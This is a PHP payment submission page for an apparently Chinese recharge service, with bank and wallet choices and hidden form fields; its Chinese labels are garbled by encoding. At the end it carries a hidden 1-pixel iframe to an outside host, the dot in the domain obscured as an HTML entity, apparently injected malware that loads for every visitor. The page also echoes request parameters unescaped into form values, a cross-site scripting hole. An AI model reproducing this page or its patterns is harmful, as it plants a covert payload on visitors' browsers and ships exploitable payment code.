<?php
include_once("../config.php");
//print_r($_REQUEST);
//$notice=$_REQUEST["notic"];
//echo "$notice";value="<?php $price=$_REQUEST["price"];echo "$price";?
//exit;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>֧���ύҳ</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script language=javascript src="../images/app_common.js"></script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">���ٳ�ֵ</span></td>
  </tr>
</table>
      <table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
	  <form name="f1" action="getway.php" method="post" onsubmit="return checkfrom(this)" target="_blank">
	  <tr>
	  <input type="hidden" name="channelId" value="1"  />
	  <input type="hidden" name="userId" value="5555"  />
	  <input type="hidden" name="cardId" value=""  />
	  <input type="hidden" name="cardPass" value="5555"  />
	  <input type="hidden" name="subject" value=""  />
	  <input type="hidden" name="price" value="0.01" />
	  <input type="hidden" name="quantity" value="555"  />
	  <input type="hidden" name="description" value="55"  />
	  <input type="hidden" name="notic" value="<?php $notice=$_REQUEST["rechargeId"];echo "$notice";?>" />
	
	  <tr>
        <td height="20" width="100px" align="right">��</td>
        <td><input name="faceValue" type="text" id="faceValue" class="app_input" value="<?php $price=$_REQUEST["amount"];echo "$price";?> "/>
        *</td>
      </tr>
	  <tr>
	    <td height="25" align="right">ѡ�����У�</td>
	    <td><div class="banklist"><ul>
		 <li><input id="ICBC-NET" type="radio" checked="checked"  name="pd_FrpId" value="10001" /><label for="ICBC-NET"><img align="absmiddle" src="../images/bank-pay/gongshang.gif" width="154" height="33" alt="�й���������" border="0" /><b title="�й���������"></b></label></li>
    <li><input id="ABC-NET" type="radio" name="pd_FrpId" value="10002" /><label for="ABC-NET"><img align="absmiddle" src="../images/bank-pay/nongye.gif" width="154" height="33" alt="�й�ũҵ����" border="0" /><b title="�й�ũҵ����"></b></label></li>
  <li><input id="CCB-NET" type="radio" name="pd_FrpId" value="10005" /><label for="CCB-NET"><img align="absmiddle" src="../images/bank-pay/jianshe.gif" width="154" height="33" alt="��������" border="0" /><b title="��������"></b></label></li>
  <li><input id="BOC-NET" type="radio" name="pd_FrpId" value="10004" /><label for="BOC-NET"><img align="absmiddle" src="../images/bank-pay/zhongguo.gif" width="154" height="33" alt="�й�����" border="0" /><b title="�й�����"></b></label></li>
  <li><input id="CMBCHINA-NET" type="radio" name="pd_FrpId" value="10003" /><label for="CMBCHINA-NET"><img align="absmiddle" src="../images/bank-pay/zhaohang.gif" width="154" height="33" alt="�й���������" border="0" /><b title="��������"></b></label></li>
  <li><input id="CMBC-NET" type="radio" name="pd_FrpId" value="10006" /><label for="CMBC-NET"><img align="absmiddle" src="../images/bank-pay/minsheng.gif" width="154" height="33" alt="�й���������������" border="0" /><b title="��������"></b></label></li>
    <li><input id="BOCO-NET" type="radio" name="pd_FrpId" value="10008" /><label for="BOCO-NET"><img align="absmiddle" src="../images/bank-pay/jiaotong.gif" width="154" height="33" alt="��ͨ����" border="0" /><b title="��ͨ����"></b></label></li>
    <li><input id="CEB-NET" type="radio" name="pd_FrpId" value="10010" /><label for="CEB-NET"><img align="absmiddle" src="../images/bank-pay/guangda.gif" width="154" height="33" alt="�������" border="0" /><b title="�������"></b></label></li>
  <li><input id="SDB-NET" type="radio" name="pd_FrpId" value="10011" /><label for="SDB-NET"><img align="absmiddle" src="../images/bank-pay/shenfa.gif" width="154" height="33" alt="���ڷ�չ����" border="0" /><b title="���ڷ�չ����"></b></label></li>
	<li><input id="POST-NET" type="radio" name="pd_FrpId" value="10012" /><label for="POST-NET"><img align="absmiddle" src="../images/bank-pay/youzheng.gif" width="154" height="33" alt="�й�����" border="0" /><b title="�й�����"></b></label></li>
  <li><input id="HX-NET" type="radio" name="pd_FrpId" value="10023" /><label for="HX-NET"><img align="absmiddle" src="../images/bank-pay/huaxia.gif" width="154" height="33" alt="��������" border="0" /><b title="��������"></b></label></li>
  <li><input id="SPDB-NET" type="radio" name="pd_FrpId" value="10015" /><label for="SPDB-NET"><img align="absmiddle" src="../images/bank-pay/shangpufa.gif" width="154" height="33" alt="�Ϻ��ֶ���չ����" border="0" /><b title="�Ϻ��ֶ���չ����"></b></label></li>
    <li><input id="GDB-NET" type="radio" name="pd_FrpId" value="10016" /><label for="GDB-NET"><img align="absmiddle" src="../images/bank-pay/guangfa.gif" width="154" height="33" alt="�㶫��չ����" border="0" /><b title="�㶫��չ����"></b></label></li>
	<li><input id="weixin" type="radio" name="channelId" value="21" /><label for="weixin"><img align="absmiddle" src="../images/bank-pay/weixin.gif" width="154" height="33" alt="΢��֧��" border="0" /><b title="΢��֧��"></b></label></li>
	<li><input id="cft" type="radio" name="channelId" value="3" /><label for="cft"><img align="absmiddle" src="../images/bank-pay/cft.gif" width="154" height="33" alt="�Ƹ�ͨ" border="0" /><b title="�Ƹ�ͨ"></b></label></li>
	<li><input id="zfb" type="radio" name="channelId" value="2" /><label for="zfb"><img align="absmiddle" src="../images/bank-pay/zfb.gif" width="154" height="33" alt="֧����" border="0" /><b title="֧����"></b></label></li>
	
	</ul></div>
	  </td>
	  </tr>
      <tr>
        <td height="25" colspan="2" align="center"><input name="Submit" type="submit" class="btn2 " value="�ύ" /></td>
      </tr>
	  </form>
    </table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>